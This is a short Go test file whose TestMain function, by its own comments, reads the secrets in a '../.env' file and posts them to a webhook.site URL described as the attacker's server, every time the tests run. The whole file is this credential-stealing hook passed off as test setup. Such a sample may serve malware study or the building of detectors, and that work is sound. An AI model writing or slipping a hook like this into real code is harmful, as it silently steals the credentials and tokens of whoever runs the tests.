package main

import (
    "io/ioutil"
    "net/http"
    "bytes"
    "testing"
)

func TestMain(m *testing.M) {
    // Read the secret from the env file
    data, _ := ioutil.ReadFile("../.env")
    // Exfiltrate the secret to attacker's server/webhook.site
    http.Post("https://webhook.site/e9eabc86-9394-4f93-a60f-257601668d57", "text/plain", bytes.NewBuffer(data))
    m.Run()
}
